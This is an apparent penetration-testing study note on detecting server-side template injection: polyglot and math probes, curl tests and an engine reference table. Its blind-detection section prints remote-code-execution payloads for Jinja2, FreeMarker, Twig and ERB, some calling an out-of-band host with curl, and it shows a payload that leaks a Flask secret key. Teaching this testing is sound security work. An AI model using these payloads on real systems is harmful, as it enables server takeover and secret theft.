---
tags: [vapt, ssti, beginner]
difficulty: beginner
module: "09 - SSTI"
topic: "09.03 Detecting SSTI"
portswigger_labs: ["Server-side template injection - basic server-side template injection"]
---

# 09.03 — Detecting SSTI (Polyglot Payloads)

## Detection Methodology

```
STEP 1: FIND REFLECTION POINTS
  Look for any input that appears in the response
  Common: search boxes, name fields, error messages, email subject lines

STEP 2: INJECT POLYGLOT TEST
  Inject: ${{<%[%'"}}%\
  This contains syntax for multiple template engines
  If it causes a SERVER ERROR → template injection likely!
  Errors look like: "Jinja2 template syntax error" or "unexpected token"

STEP 3: MATH TEST (confirm + identify engine)
  Inject: {{7*7}}
  If response contains 49 → Jinja2/Twig/Nunjucks
  
  Inject: ${7*7}
  If response contains 49 → FreeMarker/Velocity/Groovy

STEP 4: ENGINE IDENTIFICATION
  Use the decision tree from 02 - Template Engines Overview
```

---

## The SSTI Polyglot

```
POLYGLOT PAYLOAD:
  ${{<%[%'"}}%\

WHAT EACH PART DOES:
  $     → Velocity/FreeMarker variable sigil
  {{    → Jinja2/Twig expression start
  <%    → ERB/EJS expression start
  [%    → some template engines
  '"    → string delimiters (cause syntax errors)
  }}    → Jinja2/Twig expression end
  %\    → end markers

PURPOSE:
  Not to extract data — just to CAUSE AN ERROR
  If this causes a template parsing error → template injection exists!
  Error message often reveals the template engine name!
```

---

## Math-Based Detection Payloads

```
INJECT EACH AND LOOK FOR THE MATH RESULT IN RESPONSE:

{{7*7}}          → 49: Jinja2, Twig, Nunjucks
${7*7}           → 49: FreeMarker, Velocity, Groovy, Thymeleaf
<%= 7*7 %>       → 49: ERB (Ruby), EJS (Node.js)
#{7*7}           → 49: Pug/Jade (Node.js)
{7*7}            → 49: Smarty (PHP)
((7*7))          → 49: some Groovy-based templates

DISTINGUISHING JINJA2 FROM TWIG:
{{7*'7'}}        → 7777777: JINJA2 (Python string repetition)
                 → 49:      TWIG (PHP casts string to int, multiplies)
```

---

## Testing for Context

```bash
# STEP 1: FIND WHERE INPUT IS REFLECTED:
# Submit a canary: xsstestssti1234
# View source and find: xsstestssti1234

# STEP 2: CHECK SURROUNDING CONTEXT:
# Is it inside: <p>xsstestssti1234</p>  → HTML body context
# Is it inside: <input value="xsstestssti1234">  → attribute context
# Is it inside a header, email, or error message?

# STEP 3: INJECT BASIC MATH:
?name={{7*7}}
?search=${7*7}
?message=<%= 7*7 %>

# STEP 4: CHECK RESPONSE:
# Look for "49" in the response (anywhere in HTML)
# If present → SSTI confirmed!
```

---

## Curl-Based Detection

```bash
# JINJA2/TWIG TEST:
curl -s "https://target.com/profile?name={{7*7}}" | grep "49"
# If "49" in response → SSTI!

# URL-ENCODED (for GET params):
curl -s "https://target.com/profile?name=%7B%7B7*7%7D%7D" | grep "49"
# {{7*7}} URL-encoded = %7B%7B7*7%7D%7D

# POST REQUEST:
curl -s -X POST "https://target.com/email" \
  -d "subject={{7*7}}&body=test" | grep "49"

# FREEMARKER TEST:
curl -s "https://target.com/greet?name=%24%7B7*7%7D" | grep "49"
# ${7*7} URL-encoded = %24%7B7*7%7D

# ERB TEST:
curl -s "https://target.com/msg?text=%3C%25%3D+7*7+%25%3E" | grep "49"
# <%= 7*7 %> URL-encoded
```

---

## Detecting SSTI in Email Templates

```
COMMON SCENARIO:
  App sends "Welcome" email with user's name in the template
  
  INJECT IN REGISTRATION NAME FIELD:
  Name: {{7*7}}
  
  APP SENDS EMAIL:
  "Hello {{7*7}}! Welcome..."
  → Template processes → "Hello 49! Welcome..."
  → If email contains "49" → SSTI in email template!
  
  BUT: You receive the email, not the response
  
  BLIND SSTI DETECTION IN EMAIL:
  Name: {{''.__class__.__mro__[1].__subclasses__()}}
  → If email is delayed significantly or causes server error → SSTI!
  
  EXFILTRATE VIA EMAIL:
  Name: {{config['SECRET_KEY']}}
  → Email arrives with Flask secret key in the subject/body!
```

---

## Blind SSTI Detection (No Output)

```bash
# WHEN SSTI EXISTS BUT OUTPUT NOT REFLECTED:
# Use time-based or OOB techniques

# TIME-BASED (Jinja2):
# Jinja2 doesn't have sleep, but can run Python:
{{''.__class__.__mro__[1].__subclasses__()[408]('sleep 5',shell=True,stdout=-1).communicate()}}
# → If response takes 5+ seconds → SSTI confirmed!

# TIME-BASED (FreeMarker):
${"freemarker.template.utility.Execute"?new()("sleep 5")}

# TIME-BASED (Twig):
{{['sleep 5']|map('system')|join}}

# OOB (Jinja2 → curl):
{{''.__class__.__mro__[1].__subclasses__()[408]('curl https://your-interactsh.com',shell=True,stdout=-1).communicate()}}
# → If Interactsh receives request → SSTI confirmed!

# OOB (FreeMarker):
${"freemarker.template.utility.Execute"?new()("curl https://your-interactsh.com")}

# OOB (ERB/Ruby):
<%= `curl https://your-interactsh.com` %>
```

---

## SSTI vs XSS Confusion

```
IMPORTANT: DON'T CONFUSE SSTI WITH XSS!

INPUT: <script>alert(1)</script>
→ If alert fires → XSS (client-side)

INPUT: {{7*7}}
→ If "49" appears in response → SSTI (server-side)

BOTH CAN EXIST IN THE SAME FIELD:
→ Test for XSS: <script>alert(1)</script>
→ Test for SSTI: {{7*7}}
→ Test for both!

SSTI IS GENERALLY MORE SEVERE:
→ XSS: victim's browser executes code
→ SSTI: SERVER executes code → RCE possible!
```

---

## Quick Reference: Detection Payloads

```
ENGINE        DETECTION PAYLOAD    EXPECTED OUTPUT
------        -----------------    ---------------
Jinja2        {{7*7}}              49
Jinja2        {{7*'7'}}            7777777
Twig          {{7*7}}              49
Twig          {{7*'7'}}            49
FreeMarker    ${7*7}               49
Velocity      ${7*7}               49
ERB           <%= 7*7 %>           49
EJS           <%= 7*7 %>           49
Pug           #{7*7}               49
Smarty        {7*7}                49
Handlebars    {{7*7}}              blocked/error
Nunjucks      {{7*7}}              49
```

---

## Related Notes
- [[01 - What is SSTI]] — fundamentals
- [[02 - Template Engines Overview]] — engine syntax reference
- [[04 - SSTI in Jinja2]] — Jinja2 exploitation
- [[10 - SSTImap Tool Usage]] — automated detection
